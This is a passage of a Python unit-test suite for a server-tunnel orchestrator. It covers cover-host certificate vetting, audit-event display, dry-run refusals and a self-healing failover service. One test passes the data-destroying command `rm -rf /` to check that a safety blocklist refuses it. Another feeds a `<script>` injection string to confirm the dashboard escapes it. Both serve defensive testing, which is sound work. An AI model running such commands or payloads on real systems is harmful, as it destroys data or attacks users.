            engine.get_ssh_runner = real_factory
        self.assertIn("9999-prod", str(refused.exception),
                      "the refusal still names whose rule is in force, after the guard was rewritten")
        self.assertEqual(sorted(r.host_role for r in made), ["foreign", "iran"],
                         "a refusal that never opened both hosts would pass this test for the wrong "
                         "reason")
        for runner in made:
            self.assertFalse(runner.connected,
                             f"the carrier refusal left its {runner.host_role} session open")
            self.assertEqual(runner.state["files"], {},
                             f"{runner.host_role}: a refused deploy staged files on the host")

        # ---- 7. The cover-vetting tool moved into the repository, so it is judged by the same rule.
        # A tool that only ever lived in a gitignored directory could claim "the pool is decided by
        # measurement" without that claim being part of what ships. Now that it ships, its opens are
        # the product's opens: the ordinary failure of this pair is the second host refusing to
        # authenticate, and the first session has to survive that only as a closed session.
        made = []

        def vet_factory(spec, dry_run=None, host_role="unknown"):
            if host_role == "foreign":
                raise ConnectionResetError("Error reading SSH protocol banner")
            made.append(RecordingRunner(host_role=host_role))
            return made[-1]

        real_mock_factory = mock_ssh.get_ssh_runner
        mock_ssh.get_ssh_runner = vet_factory
        saved_db = storage.DB_PATH
        # This suite's own fixture database deliberately lives in orchestrator/, isolated per pid, and
        # `main()` refuses to run against it - correctly. Pointing it outside is what lets the test reach
        # the window it is measuring, and the refusal itself is pinned separately in test_117.
        storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "outside_repo.db")
        try:
            with env_vars(BEST_TUNNEL_DRY_RUN="0", IR_HOST=ir_pub, FR_HOST=fr_pub,
                          IR_PASS="standin-not-a-credential", FR_PASS="standin-not-a-credential"):
                self.assertFalse(storage.db_is_inside_repo(),
                                 "the harness must be in the state the run is allowed to proceed past")
                with self.assertRaises(ConnectionResetError):
                    vet_reality_covers.main()
        finally:
            mock_ssh.get_ssh_runner = real_mock_factory
            storage.DB_PATH = saved_db
        self.assertEqual([r.host_role for r in made], ["iran"],
                         "the witness has to reach the failing second host, or it proves nothing")
        self.assertFalse(made[0].connected,
                         "the vetting tool stranded its Iran session when Foreign would not answer")
        self.assertEqual(made[0].issued(), "",
                         "a vetting run that never got both hosts must not have issued a single command")

    def test_117_reality_cover_vetting_decisions_are_made_offline_and_refuse_without_a_live_env(self):
        """#43: the pool's decision logic is now a shipped, unit-tested function, not a script's prose.

        `protocols.validate_reality_cover` was already pure and already tested; what was not
        reproducible was everything *before* it - the parsing of one `openssl s_client` run into the
        five facts, and the wildcard rule that decides whether a certificate hosts the name it was
        dialed with. Those live in vet_reality_covers.py, and the second one is the judgement that
        removes a cover from the pool, so both directions are pinned here: a name the certificate does
        serve, a default-vhost certificate that serves a different name, and a wildcard that is one
        label wide rather than a whole tree.

        The three refusals in `main()` are shown able to fire one at a time, each before any session is
        opened - the gate that keeps "this script touches live servers" a deliberate act.
        """
        facts_line = ("FACTS name=www.example.com v4=2 v6=0 tcp=OK tls=TLSv1.3 verify=0 alpn=h2 "
                      "cn=www.example.com san=X509v3SubjectAlternativeName:DNS:www.example.com,"
                      "DNS:*.example.com")
        parsed = vet_reality_covers.parse(facts_line)
        self.assertEqual(parsed["name"], "www.example.com")
        self.assertEqual(parsed["v4"], "2", "the SAN label has to survive the token sweep")
        self.assertTrue(vet_reality_covers.to_facts(parsed)["resolves_v4"])
        self.assertTrue(vet_reality_covers.to_facts(parsed)["sni_hosted"])
        self.assertEqual(vet_reality_covers.parse("connection refused"), {},
                         "a probe that produced no FACTS line must not be read as a passing cover")

        # The certificate that hosts the name, and the one that does not.
        self.assertTrue(vet_reality_covers.sni_hosted("www.example.com", "DNS:www.example.com", ""))
        self.assertTrue(vet_reality_covers.sni_hosted("a.example.com", "", "a.example.com"),
                        "a CN-only leaf is still an answer about that name")
        self.assertFalse(vet_reality_covers.sni_hosted("www.example.com", "DNS:default.vhost.net", ""),
                         "a default-vhost certificate is the failure this requirement exists for")
        self.assertTrue(vet_reality_covers.sni_hosted("api.apple.com", "DNS:*.apple.com", ""))
        self.assertFalse(vet_reality_covers.sni_hosted("cdn.api.apple.com", "DNS:*.apple.com", ""),
                         "a wildcard covers one label, not a tree - accepting the deeper name would "
                         "keep a cover that answers with a different certificate")
        self.assertTrue(vet_reality_covers.sni_hosted("www.example.com", "DNS:*.example.com,DDNS:zz", ""),
                        "greedy parsing of the SAN list must keep every entry, not the last one")

        # Every requirement is a fact the operator can be told about, and one missing fact is a refusal.
        ok, failures = protocols.validate_reality_cover(
            "www.example.com", {"resolves_v4": True, "tcp_open": False, "tls13": False,
                                "chain_verified": True, "sni_hosted": True})
        self.assertFalse(ok)
        self.assertEqual(failures, ["tcp_open", "tls13"],
                         "an operator told only the first failure chases the wrong host")
        self.assertEqual(protocols.REALITY_COVER_POOL, tuple(protocols.REALITY_COVER_POOL))
        for name in protocols.REALITY_COVER_POOL:
            self.assertIn(name, vet_reality_covers.CANDIDATES,
                          f"{name} ships in the pool but the re-vetting tool no longer measures it, so "
                          f"the next run cannot confirm it")

        # Addresses never leave this tool as addresses, in either family. The doubled brackets on the v6
        # row are `ss`'s own brackets around a masked address - cosmetic, and the identity is gone.
        self.assertEqual(vet_reality_covers.scrub("failed on 203.0.113.20 and [2a01:4f8:1:2::3]:443"),
                         "failed on [addr] and [[addr]]:443")
        self.assertEqual(vet_reality_covers.scrub("cn=10.10.11.1"), "cn=[addr]",
                         "this artifact is prose, so it masks the private ranges storage keeps for "
                         "functional bind text")
        self.assertEqual(vet_reality_covers.scrub(""), "")

        # The artifact goes where the database goes, and both refusals that keep it out of the tree fire.
        saved_db = storage.DB_PATH
        storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "outside_repo.db")
        out_path = vet_reality_covers.artifact_path()
        storage.DB_PATH = saved_db
        self.assertTrue(out_path.endswith("vet_reality_covers.out"))
        self.assertNotIn(os.path.abspath(storage.repo_root()).lower(), out_path.lower(),
                         "the run record contains hostnames and certificate subjects; it may not land "
                         "inside the deliverable")

        real_mock_factory = mock_ssh.get_ssh_runner
        opened = []
        mock_ssh.get_ssh_runner = lambda spec, dry_run=None, host_role="unknown": (
            opened.append(host_role) or RecordingRunner(host_role=host_role))
        self.addCleanup(setattr, mock_ssh, "get_ssh_runner", real_mock_factory)
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        standins = dict(IR_HOST=ir_pub, FR_HOST=fr_pub, IR_PASS="s", FR_PASS="s")

        def refused(**env):
            """Run main() with these env settings and return its rc, keeping its prose out of the log."""
            with env_vars(**env), contextlib.redirect_stderr(io.StringIO()), \
                    contextlib.redirect_stdout(io.StringIO()):
                return vet_reality_covers.main()

        storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "outside_repo.db")
        try:
            self.assertEqual(refused(BEST_TUNNEL_DRY_RUN=None, **standins), 2,
                             "an unset BEST_TUNNEL_DRY_RUN has to refuse: dry-run is the safe default")
            self.assertEqual(refused(BEST_TUNNEL_DRY_RUN="yes", **standins), 2,
                             "an unrecognised live token is not an opt-in: the allowlist is what makes "
                             "`true` and a typo both fail safe")
            self.assertEqual(refused(BEST_TUNNEL_DRY_RUN="0", IR_HOST=None, FR_HOST=None,
                                     IR_PASS=None, FR_PASS=None), 2,
                             "no live.env means no measurement, not a crash and not a silent pass")
        finally:
            storage.DB_PATH = saved_db
        self.assertEqual(refused(BEST_TUNNEL_DRY_RUN="0", **standins), 2,
                         "this suite's own fixture database is inside the working tree, and the gate has "
                         "to refuse the whole run because of it")
        self.assertEqual(opened, [],
                         "every refusal above fired before a session was opened")

    def test_118_a_destination_rotation_is_visible_without_being_re_triggered(self):
        """#39 Acceptance Test (round 065): the audit table had a writer and no reader.

        The anchor work shipped in two halves - persist the pin, refuse when it moves - and both were
        tested. What report064 measured as still open is that the refusal is ephemeral: `log_audit` wrote
        a DESTINATION_PIN_ROTATED WARNING with the old and new fingerprints, `get_audit_logs` was called
        by tests and by nothing in the product, and so the only way to learn that a key moved out of band
        was to be standing there when a deploy refused.

        This test pins the read, its scope (this pair, non-routine rows only, newest first), the fact
        that what it serves is masked, and the panel's own renderer - executed with node, including the
        case where a stored detail carries markup. It also pins what is *not* here on purpose: the panel
        has no button, because one click that forgets a pin is a MITM with a nice UI.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        stamp = int(time.time() * 1000)
        pid = storage.add_pair(name=f"s39ev_{stamp}", iran_host=ir_pub, foreign_host=fr_pub,
                               frontend_port=9443)
        other = storage.add_pair(name=f"s39other_{stamp}", iran_host=ir_pub, foreign_host=fr_pub,
                                 frontend_port=9444)
        self.addCleanup(self._forget_pair, pid)
        self.addCleanup(self._forget_pair, other)

        # ---- 1. One rotation, produced by the writer that ships.
        storage.record_destination_pin(pid, "chisel-wss", "hostkey:ssh-ed25519", "AAAA-first")
        rotated = storage.record_destination_pin(pid, "chisel-wss", "hostkey:ssh-ed25519", "AAAA-second")
        self.assertEqual(rotated["status"], "rotated",
                         "the fixture has to produce the event this panel exists to show")
        events = storage.recent_security_events(pid)
        self.assertEqual([e["action"] for e in events], ["DESTINATION_PIN_ROTATED"],
                         f"the rotation is the only non-routine row this pair has: {events}")
        self.assertEqual(events[0]["status"], "WARNING")
        self.assertIn("AAAA-first", events[0]["details"])
        self.assertIn("AAAA-second", events[0]["details"])

        # ---- 2. Scope: routine rows stay out, and another pair's event stays out.
        routine = [r["action"] for r in storage.get_audit_logs(limit=500) if r["pair_id"] == pid]
        self.assertIn("ADD_PAIR", routine,
                      "canary - the exclusion above has to be a choice about a table that has rows in it")
        self.assertNotIn("ADD_PAIR", [e["action"] for e in events])
        self.assertEqual([e for e in storage.recent_security_events(other)
                          if e["action"] == "DESTINATION_PIN_ROTATED"], [],
                         "a rotated anchor on one pair is not an event on its neighbour")

        # ---- 3. Order, and the read-side mask for a row an older build wrote without one.
        with storage.db_session() as conn:
            conn.execute("INSERT INTO audit_logs (pair_id, action, status, details, created_at) "
                         "VALUES (?, 'FAILOVER_BLOCKED', 'DESTINATION_ANCHOR_REFUSAL', ?, ?)",
                         (pid, "refused against 203.0.113.20 and [2a01:4f8:ffff::9]:443", time.time()))
        events = storage.recent_security_events(pid)
        self.assertEqual([e["action"] for e in events], ["FAILOVER_BLOCKED", "DESTINATION_PIN_ROTATED"],
                         "newest first, or the panel buries the event the operator has to act on")
        served = events[0]["details"]
        self.assertNotIn("203.0.113.20", served, "an address the table holds must not leave the API")
        self.assertNotIn("2a01:4f8", served, "and the same rule covers the v6 form `ss` prints")

        # ---- 4. The payload the page is built from.
        api = self._get_api()
        self.assertEqual(api["code"], 200)
        rows = [p for p in api["body"]["pairs"] if p["id"] == pid]
        self.assertEqual(len(rows), 1)
        acts = [e["action"] for e in rows[0]["security_events"]]
        self.assertIn("DESTINATION_PIN_ROTATED", acts,
                      "the panel is fed from /api or it renders an empty box forever")
        for e in rows[0]["security_events"]:
            self.assertNotIn("203.0.113.20", json.dumps(e, ensure_ascii=False))
            self.assertNotIn("2a01:4f8", json.dumps(e, ensure_ascii=False))

        # ---- 5. The renderer, executed rather than string-matched.
        node = shutil.which("node")
        if not node:
            return
        driver = (extract_js_fn(dashboard.PAGE, "function escapeHtml(s) {") + "\n"
                  + extract_js_fn(dashboard.PAGE, "function securityEventsHtml(p, nowSec) {") + "\n"
                  + "const p = JSON.parse(process.argv[2]);\n"
                  + "process.stdout.write(securityEventsHtml(p, Number(process.argv[3])));\n")
        script = os.path.join(tempfile.mkdtemp(), "security_events.js")
        with open(script, "w", encoding="utf-8") as fh:
            fh.write(driver)

        def render(pobj, now_sec=1_800_000_600.0):
            proc = subprocess.run([node, script, json.dumps(pobj), str(now_sec)],
                                  capture_output=True, encoding="utf-8", timeout=60)
            self.assertEqual(proc.returncode, 0, proc.stderr[:400])
            return proc.stdout

        rotation_row = {"action": "DESTINATION_PIN_ROTATED", "status": "WARNING",
                        "created_at": 1_800_000_000.0,
                        "details": "the anchor this pair's client trusts moved"}
        out = render({"id": 1, "security_events": [rotation_row]})
        self.assertIn("لنگر مقصد جابه‌جا شد", out, "the row has to be named in Persian, not as a code")
        self.assertIn("WARNING", out)
        self.assertIn("10 دقیقه پیش", out, "600 s is ten minutes; the age is arithmetic, not a label")
        self.assertIn("the anchor this pair", out)
        self.assertNotIn("<button", out,
                         "accepting a rotation stays a deliberate storage-layer call; a one-click "
                         "unpin here would be the pin's whole purpose traded away")

        out = render(None)
        self.assertIn("یک جفت موجود", out)
        out = render({"id": 1, "security_events": []})
        self.assertIn("نبودِ رکورد", out,
                      "an empty table has to be reported as absence of evidence, not as evidence of health")
        out = render({"id": 1, "security_events": []}, now_sec=None)
        self.assertNotIn("NaN", out)

        # A detail that holds markup is data: the row came from a host's error text.
        out = render({"id": 1, "security_events": [
            {"action": "DEPLOY_ROLLBACK", "status": "PARTIAL", "created_at": 1_800_000_000.0,
             "details": "<script>alert(1)</script> and an unknown action below"}]})
        self.assertIn("&lt;script&gt;", out, "the panel must not execute what the audit table stored")
        self.assertNotIn("<script>", out)

    def _forget_pair(self, pid):
        with storage.db_session() as conn:
            conn.execute("DELETE FROM pairs WHERE id = ?", (pid,))
            conn.execute("DELETE FROM audit_logs WHERE pair_id = ?", (pid,))
            # A non-dry-run deploy records a destination anchor, and storage.delete_pair leaves it
            # behind; a test that deploys has to clean the row it wrote or the next one inherits it.
            conn.execute("DELETE FROM destination_pins WHERE pair_id = ?", (pid,))

    def _forget_audit(self, pid):
        with storage.db_session() as conn:
            conn.execute("DELETE FROM audit_logs WHERE pair_id = ?", (pid,))


    def test_151_local_runner_mirrors_the_ssh_runner_contract(self):
        """The server-side healer runs on the Iran host, so its Iran leg
        needs the Runner interface without a network. LocalRunner must
        behave like SafeSSHRunner where it matters: real exits, 0600
        staged files, and the same safety blocklist - a local runner
        that skipped the blocklist would let a generated command do
        locally what the product refuses to do remotely."""
        import local_runner
        runner = local_runner.LocalRunner()
        rc, out, err = runner.run("echo hi")
        self.assertEqual(rc, 0)
        self.assertEqual(out.strip(), "hi")
        rc, _, _ = runner.run("false", check=False, best_effort=True)
        self.assertNotEqual(rc, 0)
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "secret.conf")
            runner.write_file(path, "key-material")
            self.assertEqual(oct(os.stat(path).st_mode & 0o777), "0o600")
            with open(path) as f:
                self.assertEqual(f.read(), "key-material")
        with self.assertRaises(PermissionError):
            runner.run("rm -rf /")
        runner.close()
        self.assertTrue(runner.closed)

    def test_152_healer_seeds_one_pair_db_and_never_rewinds_a_switch(self):
        """The healer's database is seeded from the install-time export:
        one pair row (with the laptop's pair id, because unit names embed
        it) and one benchmark row per ranked candidate, so the existing
        median selector ranks exactly the exported order. A restart must
        not rewind a healed switch: a row that already exists keeps its
        recorded tunnel, and benchmark rows seed only when empty, so a
        plain restart keeps the evidence it already has."""
        import healer as healer_mod
        saved = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "healer.db")
            cfg = {
                "pair_id": 7, "pair_name": "healer-test",
                "iran": {"host": "198.51.100.10", "port": 22, "user": "root"},
                "foreign": {"host": "203.0.113.20", "port": 22, "user": "root"},
                "key_path": "/etc/best-tunnel/healer_key",
                "frontend_port": 443, "active_tunnel": "GRE",
                "candidate_scores": {"GRE": 99.96, "rathole-noise": 77.07},
                "base_rtt_ms": 37.4,
            }
            healer_mod.seed_db(cfg)
            row = storage.get_pair(7)
            self.assertIsNotNone(row, "the seeded row must carry the laptop pair id")
            self.assertEqual(row["status"], "ACTIVE")
            self.assertEqual(row["active_tunnel"], "GRE")
            rows = storage.get_benchmarks(7)
            self.assertEqual(len(rows), 2)
            pair = {"id": 7, "frontend_port": 443, "backend_port": None,
                    "underlay_carrier": "",
                    "iran": {"host": "198.51.100.10", "dial_host": ""},
                    "foreign": {"host": "203.0.113.20", "dial_host": ""}}
            medians, disqualified = failover.median_protocol_scores(7, None, pair)
            self.assertEqual(medians, {"GRE": 99.96, "rathole-noise": 77.07})
            self.assertEqual(disqualified, set())
            # Simulate a healed switch, then a healer restart.
            storage.update_pair_status(7, "ACTIVE", "backhaul-wss")
            healer_mod.seed_db(cfg)
            self.assertEqual(storage.get_pair(7)["active_tunnel"], "backhaul-wss",
                             "a restart must not rewind a healed switch to the config value")
            self.assertEqual(len(storage.get_benchmarks(7)), 2,
                             "benchmark rows seed only when the table is empty")
        finally:
            storage.DB_PATH = saved

    def test_153_healer_pair_source_injects_key_auth_and_tracks_switches(self):
        """The monitor refuses a live pair with an empty auth value, and
        the healer's foreign leg authenticates with its dedicated key,
        never a password. The pair source must inject exactly that, and
        must read the active tunnel from the database on every pass, so
        a switch the healer just made is what the next pass samples."""
        import healer as healer_mod
        saved = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "healer.db")
            cfg = {
                "pair_id": 7, "pair_name": "healer-test",
                "iran": {"host": "198.51.100.10", "port": 22, "user": "root"},
                "foreign": {"host": "203.0.113.20", "port": 22, "user": "root"},
                "key_path": "/etc/best-tunnel/healer_key",
                "frontend_port": 443, "active_tunnel": "GRE",
                "candidate_scores": {"GRE": 99.0},
            }
            healer_mod.seed_db(cfg)
            source = healer_mod.build_pair_source(cfg)
            pair = source()[0]
            self.assertEqual(pair["foreign"]["auth"],
                             {"type": "key", "value": "/etc/best-tunnel/healer_key"})
            self.assertTrue(pair["iran"]["auth"]["value"])
            self.assertNotIn("password", json.dumps(pair).lower())
            self.assertEqual(pair["active_tunnel"], "GRE")
            storage.update_pair_status(7, "ACTIVE", "rathole-noise")
            self.assertEqual(source()[0]["active_tunnel"], "rathole-noise",
                             "the next pass must sample the switched tunnel, not the stale one")
        finally:
            storage.DB_PATH = saved

    def _healer_monitor_pair(self):
        return {
            "id": 7, "status": "ACTIVE", "active_tunnel": "rathole-noise",
            "mode": "manual", "frontend": 443, "frontend_port": 443,
            "base_rtt_ms": 41.0,
            "iran": {"host": "198.51.100.10", "port": 22, "dial_host": "192.0.2.10",
                     "auth": {"value": "local"}},
            "foreign": {"host": "203.0.113.20", "port": 22, "dial_host": "192.0.2.20",
                        "auth": {"type": "key", "value": "/etc/best-tunnel/healer_key"}},
        }

    def _healer_report(self, status):
        import failover as failover_mod
        down = status == "DOWN"
        return failover_mod.TunnelHealthReport(
            status=status, loss_pct=100.0 if down else 0.0,
            latency_ms=999.0 if down else 40.0,
            overhead_ratio=5.0 if down else 1.0,
            is_unit_active_iran=not down, is_unit_active_foreign=not down,
            is_socket_listening=not down, details="test",
            backend_state="answered", ttl_state="")

    def test_154_healer_mode_restarts_dead_units_before_switching(self):
        """The healer's contract is restart-first: a dead unit is the
        cheapest outage there is, and switching protocols to fix a
        process that only needed a restart pays a blackout for nothing.
        With dead units and a HEALTHY resample, the monitor must restart
        and recover without ever calling the failover manager."""
        import failover as failover_mod
        import failover_monitor as monitor_mod
        saved = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "healer.db")
            storage.init_db()
            orig_check = failover_mod.TunnelHealthChecker.__dict__["check_health"]
            calls = {"n": 0}

            def fake_check(*a, **k):
                calls["n"] += 1
                return self._healer_report("DOWN" if calls["n"] == 1 else "HEALTHY")

            class FakeRunner:
                def __init__(self):
                    self.cmds = []

                def run(self, cmd, check=True, best_effort=False, timeout=30,
                        retryable=False):
                    self.cmds.append(cmd)
                    if "is-active" in cmd:
                        return 0, "inactive\n", ""
                    return 0, "", ""

                def close(self):
                    pass

            class StubManager(failover_mod.FailoverManager):
                def __init__(self):
                    self.calls = 0

                def evaluate_and_heal(self, *a, **k):
                    self.calls += 1
                    return {"action": "FAILOVER_ATTEMPTED"}

            runner = FakeRunner()
            mgr = StubManager()
            mon = monitor_mod.FailoverMonitor(
                manager=mgr,
                policy=monitor_mod.MonitorPolicy(interval_seconds=60, down_streak=1,
                                                 saturation_enabled=False),
                pair_source=lambda: [self._healer_monitor_pair()],
                runner_factory=lambda spec, dry_run=None, host_role="unknown": runner,
                host_guard=monitor_mod.NullHostGuard(),
                dry_run=False, healer_mode=True)
            try:
                failover_mod.TunnelHealthChecker.check_health = staticmethod(fake_check)
                out = mon.run_once(auto_heal=True)[0]
            finally:
                failover_mod.TunnelHealthChecker.check_health = orig_check
            self.assertEqual(out["action"], "HEALTHY")
            self.assertEqual(mgr.calls, 0, "no switchover may run when a restart recovers it")
            self.assertTrue(any("systemctl restart" in c for c in runner.cmds),
                            "the dead units must actually have been restarted")
        finally:
            storage.DB_PATH = saved

    def test_155_healer_mode_cycles_failed_candidates_until_one_serves(self):
        """The dashboard monitor defers after one failed attempt, because
        an operator is there to take over. The healer has no operator:
        a switch that was attempted but did not serve must not defer the
        pair - the next confirmed pass tries the next candidate, and
        when the list is exhausted a fresh cycle starts. It must never
        report HEAL_DEFERRED while candidates remain untried."""
        import failover as failover_mod
        import failover_monitor as monitor_mod
        saved = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "healer.db")
            storage.init_db()
            orig_check = failover_mod.TunnelHealthChecker.__dict__["check_health"]
            orig_select = failover_mod.FailoverCandidateSelector.__dict__[
                "select_best_candidate"]
            order = ["backhaul-wss", "frp-TLS", "kcptun"]

            def fake_select(pair_id, current, allowed_protocols=None, pair=None):
                for proto in order:
                    if proto != current and (allowed_protocols is None
                                             or proto in allowed_protocols):
                        return proto
                return None

            class FakeRunner:
                def run(self, cmd, check=True, best_effort=False, timeout=30,
                        retryable=False):
                    if "nohup" in cmd:
                        return 0, "ARMED", ""
                    if "is-active" in cmd:
                        return 0, "active\n", ""
                    return 0, "", ""

                def close(self):
                    pass

            class StubManager(failover_mod.FailoverManager):
                def execute_failover(self, pair, current, target, reason="",
                                     dry_run=False, ir_runner=None, fr_runner=None,
                                     quarantine=True):
                    return {"success": False, "new_protocol": target}

            runner = FakeRunner()
            mon = monitor_mod.FailoverMonitor(
                manager=StubManager(),
                policy=monitor_mod.MonitorPolicy(interval_seconds=60, down_streak=1,
                                                 saturation_enabled=False),
                pair_source=lambda: [self._healer_monitor_pair()],
                runner_factory=lambda spec, dry_run=None, host_role="unknown": runner,
                host_guard=monitor_mod.NullHostGuard(),
                dry_run=False, healer_mode=True)
            try:
                failover_mod.TunnelHealthChecker.check_health = staticmethod(
                    lambda *a, **k: self._healer_report("DOWN"))
                failover_mod.FailoverCandidateSelector.select_best_candidate = staticmethod(
                    fake_select)
                seen = []
                for _ in range(5):
                    out = mon.run_once(auto_heal=True)[0]
                    seen.append((out["action"], (out.get("heal") or {}).get("target_protocol")))
            finally:
                failover_mod.TunnelHealthChecker.check_health = orig_check
                failover_mod.FailoverCandidateSelector.select_best_candidate = orig_select
            self.assertEqual(
                seen,
                [("FAILOVER_ATTEMPTED", "backhaul-wss"),
                 ("FAILOVER_ATTEMPTED", "frp-TLS"),
                 ("FAILOVER_ATTEMPTED", "kcptun"),
                 ("ABORT_NO_CANDIDATE", None),
                 ("FAILOVER_ATTEMPTED", "backhaul-wss")],
                "failed candidates must cycle in rank order, exhaust, then start fresh - never defer")
            self.assertNotIn("HEAL_DEFERRED", [a for a, _ in seen])
        finally:
            storage.DB_PATH = saved

    def test_156_installer_renders_unit_and_config_without_secrets(self):
        """The healer's unit is world-readable, so it must carry no
        secret: the token lives in the 0600 config, never in argv or the
        unit. And the config itself must never carry a password - the
        foreign leg authenticates with the dedicated key, the Iran leg
        is local."""
        import install_healer
        unit = install_healer.render_unit()
        self.assertIn("Restart=always", unit)
        self.assertIn("WorkingDirectory=/opt/best-tunnel/orchestrator", unit)
        self.assertIn("healer.py --config /etc/best-tunnel/healer.json", unit)
        self.assertNotIn("token", unit.lower())
        row = {"id": 3, "name": "p", "iran_host": "198.51.100.10", "iran_port": 22,
               "foreign_host": "203.0.113.20", "foreign_port": 22, "frontend_port": 443,
               "active_tunnel": "GRE", "base_rtt_ms": 40.0}
        cfg = install_healer.build_healer_config(row, {"GRE": 99.0})
        self.assertNotIn("telegram", cfg)
        self.assertNotIn("password", json.dumps(cfg).lower())
        self.assertEqual(cfg["key_path"], "/etc/best-tunnel/healer-p3_key")
        cfg = install_healer.build_healer_config(
            row, {"GRE": 99.0}, {"bot_token": "tok", "chat_id": "123"})
        self.assertEqual(cfg["telegram"], {"bot_token": "tok", "chat_id": "123"})

    def test_157_installer_exports_medians_without_disqualified(self):
        """The healer's ranking is the laptop's median evidence - but a
        transport the sweep disqualified, or a row that was only ever
        simulated, must not come back as a healer candidate. Seeding a
        disqualified row as qualified would resurrect it."""
        import install_healer
        saved = storage.DB_PATH
        try:
            storage.DB_PATH = os.path.join(tempfile.mkdtemp(), "laptop.db")
            storage.init_db()
            pid = storage.add_pair("t", "198.51.100.10", "203.0.113.20")
            storage.record_benchmark(pid, "GRE", {"score": 99.0,
                                                  "breakdown": {"lat_avg": 40.0, "loss_pct": 0.0}})
            storage.record_benchmark(pid, "singbox-ss-2022",
                                     {"score": 50.0, "disqualified": True,
                                      "breakdown": {"lat_avg": 90.0, "loss_pct": 0.0}})
            storage.record_benchmark(pid, "wstunnel-v10",
                                     {"score": 80.0,
                                      "breakdown": {"lat_avg": 60.0, "loss_pct": 0.0},
                                      "iperf3": {"capacity_basis": "simulated"}})
            row = storage.get_pair(pid)
            medians = install_healer.export_medians(pid, install_healer.pair_dict_from_row(row))
            self.assertEqual(medians, {"GRE": 99.0})
        finally:
            storage.DB_PATH = saved

    def test_158_installer_host_steps_are_idempotent(self):
        """Re-running the installer must not duplicate the keypair, the
        authorised key or the config: a re-install after a fresh
        benchmark picks up new medians, it does not stack a second key
        onto the foreign host or regenerate the Iran host's identity."""
        import install_healer

        class FakeHost:
            def __init__(self):
                self.files = {}
                self.execs = []
                self.writes = []

            def exec(self, cmd, timeout=120, check=True):
                self.execs.append(cmd)
                if cmd.startswith("test -e "):
                    path = cmd.split()[-1]
                    return (0, "", "") if path in self.files else (1, "", "")
                if cmd.startswith("echo $HOME"):
                    return 0, "/root\n", ""
                if "is-active" in cmd:
                    return 0, "active\n", ""
                if cmd.startswith("ssh-keygen"):
                    self.files["/etc/best-tunnel/healer_key"] = "private"
                    self.files["/etc/best-tunnel/healer_key.pub"] = "ssh-ed25519 FAKE"
                    return 0, "", ""
                if "--once" in cmd:
                    return 0, '[{"action": "HEALTHY"}]', ""
                return 0, "", ""

            def read_file(self, path):
                return self.files.get(path, "")

            def write_file(self, path, content, mode=0o600):
                self.files[path] = content
                self.writes.append(path)

            def close(self):
                pass

        cfg = {
            "pair_id": 7, "pair_name": "t",
            "iran": {"host": "198.51.100.10", "port": 22, "user": "root"},
            "foreign": {"host": "203.0.113.20", "port": 22, "user": "root"},
            "key_path": "/etc/best-tunnel/healer_key",
            "frontend_port": 443, "active_tunnel": "GRE",
            "candidate_scores": {"GRE": 99.0},
            "db_path": "/var/lib/best-tunnel/healer.db",
            "heartbeat_path": "/var/lib/best-tunnel/healer-heartbeat.json",
        }
        iran, foreign = FakeHost(), FakeHost()
        iran.files["/var/lib/best-tunnel/healer-heartbeat.json"] = '{"updated_at": "x"}'
        code = {"healer.py": "# healer", "local_runner.py": "# runner"}
        install_healer.install(iran, foreign, cfg, code, settle_seconds=0)
        install_healer.install(iran, foreign, cfg, code, settle_seconds=0)
        keygens = [c for c in iran.execs if c.startswith("ssh-keygen")]
        self.assertEqual(len(keygens), 1, "the keypair must be created once, then reused")
        auth_writes = [p for p in foreign.writes if p.endswith("authorized_keys")]
        self.assertEqual(len(auth_writes), 1, "the public key must be appended once, not stacked")
        self.assertIn("ssh-ed25519 FAKE", foreign.files["/root/.ssh/authorized_keys"])
        agent_stops = [c for c in iran.execs + foreign.execs
                       if "best-tunnel-agent" in c]
        self.assertTrue(agent_stops, "the old agents must be retired on both hosts")


if __name__ == "__main__":
    unittest.main()
